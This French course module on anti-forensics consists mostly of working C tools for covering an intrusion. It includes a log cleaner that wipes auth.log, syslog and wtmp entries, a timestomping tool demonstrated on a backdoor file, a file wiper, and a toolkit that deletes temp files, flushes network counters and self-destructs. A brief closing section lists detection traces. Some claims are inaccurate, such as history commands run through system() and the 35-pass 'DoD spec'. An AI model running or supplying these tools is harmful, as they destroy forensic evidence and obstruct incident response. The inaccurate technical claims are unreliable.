# Module 57 : Forensics et Anti-Forensics

## 🎯 Ce que tu vas apprendre

Dans ce module, tu vas maîtriser :
- Comprendre les techniques forensics
- Effacer tes traces (logs, historique, artifacts)
- Timestomping et manipulation de métadonnées
- Anti-forensics avancées
- Cleanup post-exploitation
- Countermeasures contre l'analyse forensique
- Techniques de data wiping sécurisé

## 📚 Théorie

### C'est quoi le forensics ?

Le **forensics** (ou investigation numérique) consiste à analyser un système compromis pour :
- Identifier l'attaquant
- Comprendre la méthode d'intrusion
- Évaluer l'impact
- Collecter des preuves

### Artefacts forensiques

1. **Logs système** : /var/log/auth.log, syslog, etc.
2. **Historique commandes** : .bash_history, .zsh_history
3. **Timestamps** : atime, mtime, ctime
4. **Processus** : Memory dumps, /proc
5. **Réseau** : Connexions, pcap files
6. **Fichiers temporaires** : /tmp, browser cache

### Anti-forensics

L'**anti-forensics** consiste à effacer ou masquer les traces pour :
- Éviter l'attribution
- Prolonger l'accès
- Compliquer l'investigation
- Protéger l'identité de l'attaquant

## 🔍 Visualisation

### Timeline d'une intrusion et artifacts

```
┌─────────────────────────────────────────────────────┐
│         INTRUSION TIMELINE & ARTIFACTS              │
├─────────────────────────────────────────────────────┤
│                                                     │
│  T0: Initial Access                                 │
│  ┌────────────────────────────────────┐            │
│  │ - SSH bruteforce successful        │            │
│  │ Artifacts:                         │            │
│  │   • /var/log/auth.log (failed +    │            │
│  │     successful login)              │            │
│  │   • .bash_history (commands)       │            │
│  │   • /var/log/wtmp (login records)  │            │
│  └────────────────────────────────────┘            │
│                                                     │
│  T1: Privilege Escalation                           │
│  ┌────────────────────────────────────┐            │
│  │ - Exploit CVE-XXXX                 │            │
│  │ Artifacts:                         │            │
│  │   • /var/log/syslog (kernel msgs)  │            │
│  │   • Core dumps                     │            │
│  │   • SUID file execution            │            │
│  └────────────────────────────────────┘            │
│                                                     │
│  T2: Persistence                                    │
│  ┌────────────────────────────────────┐            │
│  │ - Backdoor installation            │            │
│  │ Artifacts:                         │            │
│  │   • Cron jobs (/var/spool/cron)    │            │
│  │   • Systemd services                │            │
│  │   • Modified .bashrc               │            │
│  │   • File timestamps (mtime/ctime)  │            │
│  └────────────────────────────────────┘            │
│                                                     │
│  T3: Data Exfiltration                              │
│  ┌────────────────────────────────────┐            │
│  │ - Data stolen via HTTPS            │            │
│  │ Artifacts:                         │            │
│  │   • Network logs (firewall)        │            │
│  │   • /proc/net/tcp (connections)    │            │
│  │   • Browser history                │            │
│  │   • DNS queries                    │            │
│  └────────────────────────────────────┘            │
│                                                     │
│  T4: Cleanup (Anti-Forensics)                       │
│  ┌────────────────────────────────────┐            │
│  │ - Log clearing                     │            │
│  │ - History deletion                 │            │
│  │ - Timestamp manipulation           │            │
│  │ - File wiping                      │            │
│  └────────────────────────────────────┘            │
│                                                     │
└─────────────────────────────────────────────────────┘
```

### Forensics vs Anti-Forensics

```
┌─────────────────────────────────────────────────────┐
│       FORENSICS VS ANTI-FORENSICS                   │
├─────────────────────────────────────────────────────┤
│                                                     │
│  Forensic Analyst           Red Team Operator       │
│                                                     │
│  1. Log Analysis                                    │
│  ┌──────────────────┐      ┌──────────────────┐    │
│  │ Check auth.log   │      │ Clear logs       │    │
│  │ for logins       │◄─────│ Modify timestamps│    │
│  └──────────────────┘      └──────────────────┘    │
│                                                     │
│  2. File Analysis                                   │
│  ┌──────────────────┐      ┌──────────────────┐    │
│  │ Check mtime/ctime│      │ Timestomping     │    │
│  │ Find recent files│◄─────│ Touch -t         │    │
│  └──────────────────┘      └──────────────────┘    │
│                                                     │
│  3. Memory Analysis                                 │
│  ┌──────────────────┐      ┌──────────────────┐    │
│  │ Dump RAM         │      │ Encrypt payloads │    │
│  │ Volatility       │◄─────│ Fileless malware │    │
│  └──────────────────┘      └──────────────────┘    │
│                                                     │
│  4. Network Analysis                                │
│  ┌──────────────────┐      ┌──────────────────┐    │
│  │ PCAP analysis    │      │ Encrypted C2     │    │
│  │ IDS alerts       │◄─────│ Domain fronting  │    │
│  └──────────────────┘      └──────────────────┘    │
│                                                     │
│  5. Hash Analysis                                   │
│  ┌──────────────────┐      ┌──────────────────┐    │
│  │ File integrity   │      │ Polymorphic code │    │
│  │ checksums        │◄─────│ Different hashes │    │
│  └──────────────────┘      └──────────────────┘    │
│                                                     │
└─────────────────────────────────────────────────────┘
```

## 💻 Exemple pratique

### Exemple 1 : Nettoyage des logs

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

void clear_auth_log() {
    printf("[*] Clearing /var/log/auth.log...\n");

    // Méthode 1: Vider complètement (suspect!)
    // system("echo '' > /var/log/auth.log");

    // Méthode 2: Supprimer des lignes spécifiques (meilleur)
    const char *ip_to_hide = "192.168.1.100";

    char cmd[512];
    snprintf(cmd, sizeof(cmd),
             "sed -i '/%s/d' /var/log/auth.log",
             ip_to_hide);

    system(cmd);

    printf("[+] Removed entries containing %s\n", ip_to_hide);
}

void clear_bash_history() {
    printf("[*] Clearing bash history...\n");

    // Méthode 1: Supprimer le fichier
    system("rm -f ~/.bash_history");

    // Méthode 2: Vider le fichier
    system("cat /dev/null > ~/.bash_history");

    // Méthode 3: Désactiver l'historique pour la session
    system("unset HISTFILE");

    // Méthode 4: Effacer l'historique en mémoire
    system("history -c");

    printf("[+] Bash history cleared\n");
}

void clear_wtmp() {
    printf("[*] Clearing wtmp (login records)...\n");

    // wtmp contient les logins
    system("echo '' > /var/log/wtmp");
    system("echo '' > /var/log/btmp");

    printf("[+] Login records cleared\n");
}

void clear_lastlog() {
    printf("[*] Clearing lastlog...\n");

    // lastlog montre les derniers logins
    system("echo '' > /var/log/lastlog");

    printf("[+] Last login records cleared\n");
}

void selective_log_cleaning(const char *username) {
    printf("[*] Selective log cleaning for user: %s\n", username);

    char cmd[512];

    // Nettoyer auth.log
    snprintf(cmd, sizeof(cmd),
             "sed -i '/%s/d' /var/log/auth.log",
             username);
    system(cmd);

    // Nettoyer syslog
    snprintf(cmd, sizeof(cmd),
             "sed -i '/%s/d' /var/log/syslog",
             username);
    system(cmd);

    // Nettoyer wtmp (plus complexe, nécessite outil spécialisé)
    // Utiliser 'utmpdump' pour éditer

    printf("[+] Selective cleaning complete\n");
}

int main(int argc, char *argv[]) {
    if (geteuid() != 0) {
        printf("[-] This program requires root privileges\n");
        return 1;
    }

    printf("=== Log Cleaning Tool ===\n\n");

    printf("Options:\n");
    printf("1. Clear auth.log\n");
    printf("2. Clear bash history\n");
    printf("3. Clear wtmp/btmp\n");
    printf("4. Clear lastlog\n");
    printf("5. Selective cleaning\n");
    printf("6. Clear ALL\n");

    printf("\nChoice: ");

    int choice;
    scanf("%d", &choice);

    switch (choice) {
        case 1:
            clear_auth_log();
            break;
        case 2:
            clear_bash_history();
            break;
        case 3:
            clear_wtmp();
            break;
        case 4:
            clear_lastlog();
            break;
        case 5:
            printf("Username: ");
            char username[64];
            scanf("%s", username);
            selective_log_cleaning(username);
            break;
        case 6:
            clear_auth_log();
            clear_bash_history();
            clear_wtmp();
            clear_lastlog();
            printf("\n[+] All logs cleared\n");
            break;
        default:
            printf("[-] Invalid choice\n");
    }

    return 0;
}
```

### Exemple 2 : Timestomping (manipulation de timestamps)

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <utime.h>
#include <time.h>

void show_timestamps(const char *filename) {
    struct stat st;

    if (stat(filename, &st) == -1) {
        perror("stat");
        return;
    }

    printf("File: %s\n", filename);
    printf("  Access time (atime):     %s", ctime(&st.st_atime));
    printf("  Modification time (mtime): %s", ctime(&st.st_mtime));
    printf("  Change time (ctime):     %s", ctime(&st.st_ctime));
}

void match_timestamps(const char *source, const char *target) {
    struct stat source_st;
    struct utimbuf times;

    printf("[*] Matching timestamps...\n");

    // Obtenir les timestamps du fichier source
    if (stat(source, &source_st) == -1) {
        perror("stat source");
        return;
    }

    // Appliquer au fichier target
    times.actime = source_st.st_atime;
    times.modtime = source_st.st_mtime;

    if (utime(target, &times) == -1) {
        perror("utime");
        return;
    }

    printf("[+] Timestamps matched!\n\n");

    printf("Source:\n");
    show_timestamps(source);

    printf("\nTarget:\n");
    show_timestamps(target);
}

void set_old_timestamp(const char *filename) {
    struct utimbuf times;

    printf("[*] Setting old timestamp (1 year ago)...\n");

    // Il y a 1 an
    time_t now = time(NULL);
    time_t one_year_ago = now - (365 * 24 * 60 * 60);

    times.actime = one_year_ago;
    times.modtime = one_year_ago;

    if (utime(filename, &times) == -1) {
        perror("utime");
        return;
    }

    printf("[+] Timestamp set to 1 year ago\n\n");
    show_timestamps(filename);
}

void set_specific_date(const char *filename,
                       int year, int month, int day,
                       int hour, int min, int sec) {
    struct tm timeinfo = {0};
    struct utimbuf times;

    timeinfo.tm_year = year - 1900;
    timeinfo.tm_mon = month - 1;
    timeinfo.tm_mday = day;
    timeinfo.tm_hour = hour;
    timeinfo.tm_min = min;
    timeinfo.tm_sec = sec;

    time_t timestamp = mktime(&timeinfo);

    times.actime = timestamp;
    times.modtime = timestamp;

    if (utime(filename, &times) == -1) {
        perror("utime");
        return;
    }

    printf("[+] Timestamp set to %04d-%02d-%02d %02d:%02d:%02d\n",
           year, month, day, hour, min, sec);

    show_timestamps(filename);
}

int main(int argc, char *argv[]) {
    if (argc < 2) {
        printf("Usage:\n");
        printf("  %s show <file>\n", argv[0]);
        printf("  %s match <source> <target>\n", argv[0]);
        printf("  %s old <file>\n", argv[0]);
        printf("  %s date <file> YYYY MM DD HH MM SS\n", argv[0]);
        return 1;
    }

    printf("=== Timestomping Tool ===\n\n");

    if (strcmp(argv[1], "show") == 0 && argc == 3) {
        show_timestamps(argv[2]);
    }
    else if (strcmp(argv[1], "match") == 0 && argc == 4) {
        match_timestamps(argv[2], argv[3]);
    }
    else if (strcmp(argv[1], "old") == 0 && argc == 3) {
        set_old_timestamp(argv[2]);
    }
    else if (strcmp(argv[1], "date") == 0 && argc == 9) {
        set_specific_date(argv[2],
                          atoi(argv[3]),  // year
                          atoi(argv[4]),  // month
                          atoi(argv[5]),  // day
                          atoi(argv[6]),  // hour
                          atoi(argv[7]),  // min
                          atoi(argv[8])); // sec
    }
    else {
        printf("[-] Invalid arguments\n");
    }

    return 0;
}

/*
Utilisation:

1. Créer un fichier backdoor:
   echo "backdoor" > malware.txt

2. Voir ses timestamps:
   ./timestomp show malware.txt

3. Matcher avec un fichier légitime:
   ./timestomp match /bin/ls malware.txt

4. Ou définir un timestamp ancien:
   ./timestomp old malware.txt

5. Ou date spécifique:
   ./timestomp date malware.txt 2020 01 15 10 30 00
*/
```

### Exemple 3 : Secure File Wiping

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>

// Écraser un fichier avec des données aléatoires (DoD 5220.22-M)
void secure_wipe(const char *filename, int passes) {
    struct stat st;
    int fd;
    size_t size;
    unsigned char *buffer;

    printf("[*] Securely wiping %s (%d passes)...\n", filename, passes);

    // Obtenir la taille du fichier
    if (stat(filename, &st) == -1) {
        perror("stat");
        return;
    }

    size = st.st_size;

    // Ouvrir le fichier
    fd = open(filename, O_WRONLY);
    if (fd == -1) {
        perror("open");
        return;
    }

    // Allouer buffer
    buffer = malloc(size);
    if (!buffer) {
        close(fd);
        return;
    }

    for (int pass = 1; pass <= passes; pass++) {
        printf("  [*] Pass %d/%d...\n", pass, passes);

        // Pattern selon le pass
        unsigned char pattern;

        switch (pass % 3) {
            case 1:
                pattern = 0xFF;  // Tous à 1
                break;
            case 2:
                pattern = 0x00;  // Tous à 0
                break;
            case 0:
                // Aléatoire
                for (size_t i = 0; i < size; i++) {
                    buffer[i] = rand() % 256;
                }
                break;
        }

        if (pass % 3 != 0) {
            memset(buffer, pattern, size);
        }

        // Écrire
        lseek(fd, 0, SEEK_SET);
        write(fd, buffer, size);

        // Force sync to disk
        fsync(fd);
    }

    close(fd);
    free(buffer);

    // Supprimer le fichier
    unlink(filename);

    printf("[+] File securely wiped and deleted\n");
}

// Écraser l'espace libre d'une partition
void wipe_free_space(const char *mountpoint) {
    char filepath[512];
    snprintf(filepath, sizeof(filepath), "%s/.wipe_tmp", mountpoint);

    printf("[*] Wiping free space on %s...\n", mountpoint);
    printf("[*] Creating large file...\n");

    FILE *fp = fopen(filepath, "w");
    if (!fp) {
        perror("fopen");
        return;
    }

    // Remplir l'espace libre avec des zéros
    unsigned char buffer[4096];
    memset(buffer, 0, sizeof(buffer));

    size_t written = 0;

    while (fwrite(buffer, 1, sizeof(buffer), fp) == sizeof(buffer)) {
        written += sizeof(buffer);

        if (written % (1024 * 1024 * 100) == 0) {  // Tous les 100MB
            printf("  [*] Written: %lu MB\n", written / (1024 * 1024));
        }
    }

    fclose(fp);

    printf("[*] Removing temporary file...\n");
    unlink(filepath);

    printf("[+] Free space wiped\n");
}

int main(int argc, char *argv[]) {
    if (argc < 2) {
        printf("Usage:\n");
        printf("  %s file <filename> [passes]\n", argv[0]);
        printf("  %s freespace <mountpoint>\n", argv[0]);
        return 1;
    }

    printf("=== Secure Wiping Tool ===\n\n");

    if (strcmp(argv[1], "file") == 0 && argc >= 3) {
        int passes = (argc == 4) ? atoi(argv[3]) : 7;
        secure_wipe(argv[2], passes);
    }
    else if (strcmp(argv[1], "freespace") == 0 && argc == 3) {
        wipe_free_space(argv[2]);
    }
    else {
        printf("[-] Invalid arguments\n");
    }

    return 0;
}

/*
Utilisation:

1. Wipe un fichier sensible (7 passes par défaut):
   ./wipe file sensitive_data.txt

2. Wipe avec nombre de passes custom:
   ./wipe file sensitive_data.txt 35  # DoD 5220.22-M spec

3. Wipe l'espace libre (pour effacer fichiers supprimés):
   ./wipe freespace /home

Warning: Le wipe d'espace libre peut prendre du temps!
*/
```

### Exemple 4 : Anti-Forensics Toolkit complet

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

void disable_history() {
    printf("[*] Disabling command history...\n");

    // Désactiver l'historique bash
    setenv("HISTFILE", "/dev/null", 1);
    setenv("HISTSIZE", "0", 1);
    system("unset HISTFILE");

    // Clear existing history
    system("history -c");

    printf("[+] History disabled\n");
}

void clear_logs() {
    printf("[*] Clearing system logs...\n");

    // Liste des logs à nettoyer
    const char *logs[] = {
        "/var/log/auth.log",
        "/var/log/syslog",
        "/var/log/messages",
        "/var/log/secure",
        "/var/log/wtmp",
        "/var/log/btmp",
        "/var/log/lastlog",
        NULL
    };

    for (int i = 0; logs[i] != NULL; i++) {
        char cmd[256];

        // Vérifier si le fichier existe
        if (access(logs[i], F_OK) == 0) {
            snprintf(cmd, sizeof(cmd), "echo '' > %s 2>/dev/null", logs[i]);
            system(cmd);
            printf("  [+] Cleared: %s\n", logs[i]);
        }
    }
}

void remove_artifacts() {
    printf("[*] Removing artifacts...\n");

    // Supprimer fichiers temporaires
    system("rm -rf /tmp/* 2>/dev/null");
    system("rm -rf /var/tmp/* 2>/dev/null");

    // Supprimer core dumps
    system("rm -f /core 2>/dev/null");
    system("rm -f core.* 2>/dev/null");

    // Nettoyer ~/.cache
    system("rm -rf ~/.cache/* 2>/dev/null");

    printf("[+] Artifacts removed\n");
}

void modify_timestamps() {
    printf("[*] Modifying timestamps...\n");

    // Matcher les timestamps du backdoor avec un fichier système
    system("touch -r /bin/ls /tmp/backdoor 2>/dev/null");

    printf("[+] Timestamps modified\n");
}

void clear_network_traces() {
    printf("[*] Clearing network traces...\n");

    // Flush iptables logs
    system("iptables -Z 2>/dev/null");

    // Clear connection tracking
    system("conntrack -F 2>/dev/null");

    printf("[+] Network traces cleared\n");
}

void self_destruct(const char *script_path) {
    printf("[*] Initiating self-destruct...\n");

    // Secure wipe du script
    char cmd[512];

    // Écraser avec random data
    snprintf(cmd, sizeof(cmd),
             "dd if=/dev/urandom of=%s bs=1M count=1 2>/dev/null",
             script_path);
    system(cmd);

    // Supprimer
    unlink(script_path);

    printf("[+] Self-destruct complete\n");
}

void full_cleanup(const char *script_path) {
    printf("=== Full Anti-Forensics Cleanup ===\n\n");

    disable_history();
    clear_logs();
    remove_artifacts();
    modify_timestamps();
    clear_network_traces();

    printf("\n[!] Cleanup complete. Initiating self-destruct...\n");
    sleep(2);

    self_destruct(script_path);
}

int main(int argc, char *argv[]) {
    if (geteuid() != 0) {
        printf("[-] Root privileges required\n");
        return 1;
    }

    printf("=== Anti-Forensics Toolkit ===\n\n");

    printf("Options:\n");
    printf("1. Disable history\n");
    printf("2. Clear logs\n");
    printf("3. Remove artifacts\n");
    printf("4. Modify timestamps\n");
    printf("5. Clear network traces\n");
    printf("6. Full cleanup + self-destruct\n");

    printf("\nChoice: ");

    int choice;
    scanf("%d", &choice);

    switch (choice) {
        case 1:
            disable_history();
            break;
        case 2:
            clear_logs();
            break;
        case 3:
            remove_artifacts();
            break;
        case 4:
            modify_timestamps();
            break;
        case 5:
            clear_network_traces();
            break;
        case 6:
            full_cleanup(argv[0]);
            break;
        default:
            printf("[-] Invalid choice\n");
    }

    return 0;
}
```

## 📝 Points clés à retenir

1. **Logs** : Nettoyer auth.log, syslog, wtmp, bash_history
2. **Timestamps** : Utiliser `utime()` pour modifier mtime/atime
3. **Wiping** : Écraser avec patterns multiples avant suppression
4. **Artifacts** : Supprimer /tmp, core dumps, caches
5. **Self-destruct** : Effacer l'outil après utilisation

### Checklist anti-forensics

```
Action                    Command/Technique              Priorité
────────────────────────────────────────────────────────────────────
Clear bash history       history -c ; rm .bash_history  Haute
Clear logs               sed -i pour filtrer sélectif   Haute
Timestomping             utime() / touch -r             Moyenne
Wipe files               Multiple pass overwrite        Haute
Clear wtmp/btmp          > /var/log/wtmp                Moyenne
Disable history          unset HISTFILE                 Haute
Remove artifacts         rm /tmp/* /var/tmp/*           Moyenne
Network cleanup          iptables -Z                    Faible
Self-destruct            dd + rm                        Haute
```

### Détection malgré anti-forensics

Même avec anti-forensics, traces possibles :
- **Memory dumps** : Volatility analysis
- **Network logs** : IDS/firewall externe
- **Backups** : Copies de sauvegarde
- **Filesystem journal** : ext4 journal
- **Timeline analysis** : Gaps suspects dans logs

## ➡️ Prochaine étape

Maintenant que tu maîtrises l'anti-forensics, tu es prêt pour le **Module 58 : Cloud Security**, où tu apprendras à attaquer et sécuriser les environnements cloud (AWS, Azure, GCP).

### Ce que tu as appris
- Nettoyage de logs système
- Timestomping avancé
- Secure file wiping (DoD spec)
- Suppression d'artifacts
- Self-destruct mechanisms

### Ce qui t'attend
- Exploitation cloud (AWS, Azure, GCP)
- S3 bucket enumeration
- IAM privilege escalation
- Container escape
- Serverless exploitation
- Cloud forensics
